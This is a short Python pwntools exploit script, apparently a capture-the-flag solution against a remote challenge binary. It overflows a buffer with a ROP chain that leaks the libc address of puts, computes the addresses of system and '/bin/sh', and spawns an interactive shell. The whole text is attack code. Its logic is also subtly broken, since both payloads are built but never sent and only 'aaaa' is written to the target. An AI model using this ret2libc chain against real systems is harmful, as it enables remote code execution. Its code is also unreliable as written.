from pwn import *

# p = process('./shellcode')
p = remote('node4.anna.nssctf.cn', 28510)
elf = ELF('./shellcode')
lib = ELF('./libc6_2.27-3ubuntu1_amd64.so')
pop_rdi = 0x00000000004007b3
ret_addr = 0x000000000040028e
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
p.sendline(b'aaaa')
payload = b'a' * (0xa + 0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.recvuntil(b'This is the wrong password:')
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
print(hex(puts_addr))
base_addr = puts_addr - lib.sym['puts']
print(hex(base_addr))
system_addr = base_addr + lib.sym['system']
binsh_addr = base_addr + next(lib.search(b'/bin/sh'))
p.sendline(b'aaaa')
payload = b'a' * (0xa + 0x8) + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.recvuntil(b'This is the wrong password:')
p.interactive()
